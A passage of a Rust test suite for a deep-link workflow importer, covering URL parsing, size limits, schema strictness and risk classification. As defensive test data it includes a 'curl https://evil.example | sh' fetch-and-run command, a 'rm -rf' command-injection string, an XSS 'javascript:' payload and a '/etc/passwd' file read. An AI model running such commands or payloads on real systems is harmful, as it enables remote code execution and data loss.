            "caduceus://export/x?data={}",
            encode(&minimal_manifest())
        );
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_missing_slug() {
        let url = format!("caduceus://import/?data={}", encode(&minimal_manifest()));
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_extra_path_segments() {
        let url = format!(
            "caduceus://import/x/y?data={}",
            encode(&minimal_manifest())
        );
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_invalid_slug_characters() {
        for bad in ["Email_Assistant", "email assistant", "email/assistant", "UPPERCASE"] {
            let url = link(bad, &minimal_manifest());
            assert!(
                matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))),
                "slug {bad:?} should have been rejected"
            );
        }
    }

    /// `..` in the path is resolved by RFC 3986 dot-segment removal before this
    /// parser ever sees a slug — same as any browser or HTTP library. That is
    /// the *correct*, safe behaviour (there is no filesystem path built from
    /// the slug anywhere in this module for a traversal to reach), so this
    /// pins the actual outcome rather than asserting the naive expectation.
    #[test]
    fn dot_segments_in_the_path_are_normalised_away_before_slug_validation() {
        let url = format!(
            "caduceus://import/../etc?data={}",
            encode(&minimal_manifest())
        );
        let parsed = parse_deep_link(&url).expect("normalises to a plain 'etc' slug");
        assert_eq!(parsed.slug, "etc");
    }

    #[test]
    fn rejects_credentials_in_the_url() {
        let url = format!(
            "caduceus://user:pass@import/x?data={}",
            encode(&minimal_manifest())
        );
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_a_port() {
        let url = format!(
            "caduceus://import:1234/x?data={}",
            encode(&minimal_manifest())
        );
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_unknown_query_parameters() {
        let url = format!(
            "caduceus://import/x?data={}&run=true",
            encode(&minimal_manifest())
        );
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_duplicate_data_parameter() {
        let encoded = encode(&minimal_manifest());
        let url = format!("caduceus://import/x?data={encoded}&data={encoded}");
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_missing_data_parameter() {
        let url = "caduceus://import/x".to_string();
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_control_characters_anywhere_in_the_raw_url() {
        let url = format!("caduceus://import/x?data=abc\u{7}def");
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    // -- size bounds ---------------------------------------------------

    #[test]
    fn rejects_an_oversized_url() {
        let huge = "a".repeat(MAX_URL_LEN + 1);
        let url = format!("caduceus://import/x?data={huge}");
        assert!(matches!(parse_deep_link(&url), Err(ImportError::TooLarge(_, _))));
    }

    #[test]
    fn rejects_an_oversized_base64_payload() {
        // Valid base64url alphabet, just too long — this must be rejected on
        // length before it is ever handed to the base64 decoder.
        let huge = "A".repeat(MAX_PAYLOAD_B64_LEN + 1);
        let url = format!("caduceus://import/x?data={huge}");
        assert!(matches!(parse_deep_link(&url), Err(ImportError::TooLarge(_, _))));
    }

    #[test]
    fn rejects_a_payload_whose_decoded_size_exceeds_the_json_cap() {
        // Short enough to pass the base64-length check, but decodes to more
        // than MAX_PAYLOAD_JSON_LEN bytes — proves the decoded-size check is
        // independently reachable, not just implied by the encoded one.
        let raw_bytes = vec![b'a'; MAX_PAYLOAD_JSON_LEN + 512];
        let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&raw_bytes);
        assert!(encoded.len() <= MAX_PAYLOAD_B64_LEN, "test fixture assumption");
        let url = format!("caduceus://import/x?data={encoded}");
        assert!(matches!(parse_deep_link(&url), Err(ImportError::TooLarge(_, _))));
    }

    #[test]
    fn rejects_invalid_base64() {
        let url = "caduceus://import/x?data=not!!valid==base64".to_string();
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Malformed(_))));
    }

    #[test]
    fn rejects_too_many_actions() {
        let mut manifest = minimal_manifest();
        let actions: Vec<_> = (0..MAX_ACTIONS + 1)
            .map(|i| {
                serde_json::json!({
                    "label": format!("Action {i}"),
                    "kind": "open_url",
                    "target": "https://example.com",
                })
            })
            .collect();
        manifest["actions"] = serde_json::Value::Array(actions);
        let url = link("too-many", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_zero_actions() {
        let mut manifest = minimal_manifest();
        manifest["actions"] = serde_json::json!([]);
        let url = link("empty", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_an_unsupported_schema_version() {
        let mut manifest = minimal_manifest();
        manifest["schemaVersion"] = serde_json::json!(99);
        let url = link("future", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    // -- strict schema (deny_unknown_fields) --------------------------

    #[test]
    fn rejects_an_unrecognised_top_level_field() {
        let mut manifest = minimal_manifest();
        manifest["autoRun"] = serde_json::json!(true);
        let url = link("sneaky", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Schema(_))));
    }

    #[test]
    fn rejects_an_unrecognised_action_field() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["executeImmediately"] = serde_json::json!(true);
        let url = link("sneaky-action", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Schema(_))));
    }

    #[test]
    fn rejects_an_unrecognised_shortcut_kind() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["kind"] = serde_json::json!("delete_everything");
        let url = link("bad-kind", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Schema(_))));
    }

    // -- field-level validation -----------------------------------------

    #[test]
    fn rejects_a_label_over_the_length_cap() {
        let mut manifest = minimal_manifest();
        manifest["label"] = serde_json::json!("x".repeat(MAX_LABEL_LEN + 1));
        let url = link("long-label", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_control_characters_inside_a_label() {
        let mut manifest = minimal_manifest();
        manifest["label"] = serde_json::json!("Email\u{7}Assistant");
        let url = link("bell-label", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_too_many_args() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["args"] =
            serde_json::Value::Array((0..MAX_ARGS + 1).map(|i| serde_json::json!(format!("a{i}"))).collect());
        let url = link("many-args", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_too_many_keywords() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["keywords"] = serde_json::Value::Array(
            (0..MAX_KEYWORDS + 1).map(|i| serde_json::json!(format!("k{i}"))).collect(),
        );
        let url = link("many-keywords", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    // -- action-kind-specific validation ---------------------------------

    #[test]
    fn open_url_rejects_javascript_scheme() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["target"] = serde_json::json!("javascript:alert(1)");
        let url = link("xss", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn open_url_rejects_file_scheme() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["target"] = serde_json::json!("file:///etc/passwd");
        let url = link("file-read", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn open_url_rejects_a_recursive_caduceus_scheme() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["target"] = serde_json::json!("caduceus://import/again?data=x");
        let url = link("recursive", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn open_url_accepts_https() {
        let manifest = minimal_manifest();
        let url = link("fine", &manifest);
        assert!(parse_deep_link(&url).is_ok());
    }

    #[test]
    fn run_command_requires_a_non_empty_target() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["kind"] = serde_json::json!("run_command");
        manifest["actions"][0]["target"] = serde_json::json!("");
        let url = link("empty-command", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn run_command_with_a_target_parses_but_is_marked_high_risk() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["kind"] = serde_json::json!("run_command");
        manifest["actions"][0]["target"] = serde_json::json!("curl https://evil.example | sh");
        let url = link("shell", &manifest);
        let parsed = parse_deep_link(&url).expect("a well-formed command still parses");
        assert_eq!(risk_of(parsed.manifest.actions[0].kind), ImportRisk::High);
    }

    #[test]
    fn open_feature_rejects_a_malformed_page_id() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["kind"] = serde_json::json!("open_feature");
        manifest["actions"][0]["target"] = serde_json::json!("Page Colors; rm -rf");
        let url = link("bad-feature", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn system_monitor_rejects_a_non_empty_target() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["kind"] = serde_json::json!("system_monitor");
        manifest["actions"][0]["target"] = serde_json::json!("something");
        let url = link("bad-monitor", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_a_local_image_icon_reference() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["icon"] = serde_json::json!("image:staff-mark.png");
        let url = link("icon-probe", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn rejects_a_malformed_glyph_icon() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["icon"] = serde_json::json!("glyph:../../etc");
        let url = link("bad-glyph", &manifest);
        assert!(matches!(parse_deep_link(&url), Err(ImportError::Rejected(_))));
    }

    #[test]
    fn accepts_a_well_formed_glyph_icon() {
        let mut manifest = minimal_manifest();
        manifest["actions"][0]["icon"] = serde_json::json!("glyph:sparkle");
        let url = link("good-glyph", &manifest);
        assert!(parse_deep_link(&url).is_ok());
    }

    // -- staging / id generation -----------------------------------------

    #[test]
    fn unique_shortcut_id_never_collides_and_never_mutates_existing() {
        let existing = vec![
            Shortcut { id: "wf-foo".into(), ..Default::default() },
            Shortcut { id: "wf-foo-2".into(), ..Default::default() },
        ];
        let id = unique_shortcut_id(existing.iter().map(|s| s.id.as_str()), "foo");
        assert_eq!(id, "wf-foo-3");
        assert_eq!(existing.len(), 2, "must not have touched the input");
    }

    #[test]
    fn unique_shortcut_id_is_unprefixed_when_nothing_collides() {
        let id = unique_shortcut_id(std::iter::empty(), "email-assistant-open-gmail");
        assert_eq!(id, "wf-email-assistant-open-gmail");
    }

    #[test]
    fn build_pending_reports_the_maximum_risk_across_actions() {
        let mut manifest = minimal_manifest();
        manifest["actions"] = serde_json::json!([
            { "label": "Open", "kind": "open_url", "target": "https://example.com" },
            { "label": "Run", "kind": "run_command", "target": "echo hi" },
        ]);
        let url = link("mixed-risk", &manifest);
        let parsed = parse_deep_link(&url).expect("should parse");
        let pending = build_pending(parsed, &[]);
        assert_eq!(pending.max_risk, ImportRisk::High);
        assert_eq!(pending.actions[0].risk, ImportRisk::Low);
        assert_eq!(pending.actions[1].risk, ImportRisk::High);
    }

    #[test]
    fn build_pending_assigns_distinct_preview_ids_for_same_label_actions() {
        let mut manifest = minimal_manifest();
        manifest["actions"] = serde_json::json!([
            { "label": "Open", "kind": "open_url", "target": "https://example.com" },
            { "label": "Open", "kind": "open_url", "target": "https://example.org" },
        ]);
        let url = link("dup-labels", &manifest);
        let parsed = parse_deep_link(&url).expect("should parse");
        let pending = build_pending(parsed, &[]);
        assert_ne!(pending.actions[0].preview_id, pending.actions[1].preview_id);
    }

    #[test]
    fn inbox_evicts_the_oldest_import_once_full() {
        let inbox = WorkflowInbox::new();
        for i in 0..MAX_PENDING_IMPORTS + 2 {
            let manifest = minimal_manifest();
            let url = link(&format!("wf-{i}"), &manifest);
            let parsed = parse_deep_link(&url).unwrap();
            inbox.push(build_pending(parsed, &[]));
        }
        let listed = inbox.list();
        assert_eq!(listed.len(), MAX_PENDING_IMPORTS);
        // The oldest two (wf-0, wf-1) should have been evicted.
        assert!(listed.iter().all(|p| p.slug != "wf-0" && p.slug != "wf-1"));
    }

    #[test]
    fn dismiss_removes_exactly_the_named_token_and_nothing_else() {
        let inbox = WorkflowInbox::new();
        let parsed_a = parse_deep_link(&link("a", &minimal_manifest())).unwrap();
        let parsed_b = parse_deep_link(&link("b", &minimal_manifest())).unwrap();
        let pending_a = build_pending(parsed_a, &[]);
        let pending_b = build_pending(parsed_b, &[]);
        let token_a = pending_a.token.clone();
        inbox.push(pending_a);
        inbox.push(pending_b);

        assert!(inbox.take(&token_a).is_some());
        assert_eq!(inbox.list().len(), 1);
        assert_eq!(inbox.list()[0].slug, "b");
    }
}
